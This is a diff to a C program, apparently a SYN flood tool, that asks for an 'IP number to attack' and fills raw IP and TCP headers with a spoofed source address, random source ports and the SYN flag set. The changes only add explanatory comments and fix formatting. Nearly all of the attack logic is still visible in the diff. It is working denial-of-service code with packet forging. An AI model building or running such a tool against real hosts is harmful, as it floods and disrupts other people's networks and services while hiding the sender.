@@ -85,7 +85,7 @@ void    accept_info(FILE *interfaceFile, char *dIP, int *destPort)
     printf("Enter IP number to attack: ");
     fgets(dIP, 16, stdin);
 
-    strcpy(pseudodIP,dIP);
+    strcpy(pseudodIP, dIP);
 
     while (check_IP(pseudodIP) == 0)
     {
@@ -108,47 +108,47 @@ void    fill_struct(struct sockaddr_in sin, struct iphdr *iph, struct tcphdr *tc
         struct pseudo_header psh, int destPort, char *dIP, char *source_ip, char *datagram, int sourcePort)
 {
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(destPort);
+    sin.sin_port = htons(destPort); //htons() converts a port number in host byte order to a port number in network byte order
     sin.sin_addr.s_addr = inet_addr(dIP);
         
     //Fill in the IP Header
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 1;
-    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
+    iph->ihl = 5; //IP header length
+    iph->version = 4;  //IP version 4
+    iph->tos = 1; //Type of service(not important, bc it is not used anymore)
+    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); //Total length of datagram(network + transport)
     iph->id = htons(54321);  //Id of this packet
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
+    iph->frag_off = 0; //Fragmentation offset, 0 means that there is no fragmentation
+    iph->ttl = 255; //Time to live
+    iph->protocol = IPPROTO_TCP; //Protocol used in higher layer
     iph->check = 0;                          //Set to 0 before calculating checksum
     iph->saddr = inet_addr(source_ip);    //Spoof the source ip address
-    iph->daddr = sin.sin_addr.s_addr;
-    iph->check = csum ((unsigned short *)datagram, iph->tot_len >> 1);
+    iph->daddr = sin.sin_addr.s_addr;     //Destination IP that user entered
+    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1); //Calculate checksum
         
     //TCP Header
-    sourcePort = 1024 + (rand() % (65535 - 1024));
-    tcph->source = htons(sourcePort);
-    tcph->dest = htons(destPort);
-    tcph->seq = 0;
-    tcph->ack_seq = 1000;
-    tcph->doff = 5;      /* first and only tcp segment */
-    tcph->fin=0;
-    tcph->syn=1;
-    tcph->rst=0;
-    tcph->psh=0;
-    tcph->ack=0;
-    tcph->urg=0;
+    sourcePort = 1024 + (rand() % (65535 - 1024)); //random source port number
+    tcph->source = htons(sourcePort); //random source port number
+    tcph->dest = htons(destPort); //destination port number
+    tcph->seq = 0; //Sequence number, set to 0 bc it is the first packet
+    tcph->ack_seq = 1000; //ack bit is 0, so ack_seq is not important. but 
+    tcph->doff = 5;      /* first and only tcp segment */  //TCP header length
+    tcph->fin = 0;
+    tcph->syn = 1; //SYN flag set to 1 
+    tcph->rst = 0;
+    tcph->psh = 0;
+    tcph->ack = 0;
+    tcph->urg = 0;
     tcph->window = htons(5840); /* maximum allowed window size */
     tcph->check = 0;             /* if you set a checksum to zero, your kernel's IP stack
                                     should fill in the correct checksum during transmission */
     tcph->urg_ptr = 0;
 
     //Now the IP checksum
-    psh.source_address = inet_addr( source_ip );
+    psh.source_address = inet_addr(source_ip);
     psh.dest_address = sin.sin_addr.s_addr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(20); 
+    psh.tcp_length = htons(20);
     
     memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
     
